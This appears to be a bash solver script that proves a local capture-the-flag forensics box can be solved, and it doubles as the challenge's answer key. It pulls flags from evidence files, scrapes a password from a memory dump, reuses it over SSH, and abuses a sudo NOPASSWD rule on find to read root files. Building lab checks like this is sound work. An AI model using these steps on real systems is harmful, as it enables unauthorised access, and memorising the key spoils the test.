#!/bin/bash
# Automated end-to-end solver, used only to prove the box is solvable
# before publishing it. Requires: curl, sshpass, python3.
set -euo pipefail
cd "$(dirname "$0")/.."

HOST=localhost
WEB_PORT=8007
SSH_PORT=2207
BASE="http://$HOST:$WEB_PORT/evidence"

source .env
export CTF_SECRET

check() {
    local n="$1" got="$2"
    local want
    want=$(python3 -c "
import os, hmac, hashlib
secret = os.environ['CTF_SECRET']
d = hmac.new(secret.encode(), f'veteran-aftermath:$n'.encode(), hashlib.sha256).hexdigest()
print(f'HLC{{{d[:10]}}}')")
    if [ "$got" = "$want" ]; then
        echo "flag $n: OK ($got)"
    else
        echo "flag $n: MISMATCH got='$got' want='$want'" >&2
        exit 1
    fi
}

SSH() { sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p "$SSH_PORT" svc-monitor@"$HOST" "$@"; }

WORK=$(mktemp -d)
trap 'rm -rf "$WORK"' EXIT

# 1
F1=$(curl -s "$BASE/case_manifest.txt" | grep -oE 'HLC\{[a-f0-9]{10}\}')
check 1 "$F1"

# 2
F2=$(curl -s "$BASE/auth.log" | grep -oE 'HLC\{[a-f0-9]{10}\}')
check 2 "$F2"

# 3 (log correlation: same attacker IP in auth.log and web_access.log)
F3=$(curl -s "$BASE/web_access.log" | grep -oE 'HLC\{[a-f0-9]{10}\}')
check 3 "$F3"

# 4, 5 (pcap analysis -- strings works even without full stream reassembly)
curl -s "$BASE/capture.pcap" -o "$WORK/capture.pcap"
PCAP_FLAGS=$(strings "$WORK/capture.pcap" | grep -oE 'HLC\{[a-f0-9]{10}\}')
F4=$(echo "$PCAP_FLAGS" | sed -n '1p')
check 4 "$F4"
F5=$(echo "$PCAP_FLAGS" | sed -n '2p')
check 5 "$F5"

# 6 (memory snapshot -- also recovers the pivot host's password)
MEM=$(curl -s "$BASE/memory_snapshot.txt")
F6=$(echo "$MEM" | grep -oE 'HLC\{[a-f0-9]{10}\}')
check 6 "$F6"
PASSWORD=$(echo "$MEM" | sed -n 's/.*mysql -u root -p\([^ ]*\) .*/\1/p')

# 7 (disk image -- raw string carving, also recovers the final passphrase)
curl -s "$BASE/disk_image.img" -o "$WORK/disk_image.img"
DISK=$(strings -a "$WORK/disk_image.img")
F7=$(echo "$DISK" | grep -oE 'HLC\{[a-f0-9]{10}\}')
check 7 "$F7"
DOSSIER_PW=$(echo "$DISK" | sed -n 's/.*recovery passphrase is \([a-f0-9]*\).*/\1/p')

# 8 (the offensive pivot: SSH in with the recovered, reused credential)
F8=$(SSH 'cat flag8.txt')
check 8 "$F8"

# 9 (sudo NOPASSWD misconfiguration on `find`)
F9=$(SSH 'sudo find /root/flag9.txt -exec cat {} \;')
check 9 "$F9"

# 10 (decrypt with the passphrase recovered from the disk image)
SSH 'sudo find /root/dossier.enc -exec cat {} \;' > "$WORK/dossier.enc"
F10=$(python3 docker/flagcrypto.py decrypt "$DOSSIER_PW" "$WORK/dossier.enc" -)
check 10 "$F10"

echo
echo "All 10 flags verified end-to-end."
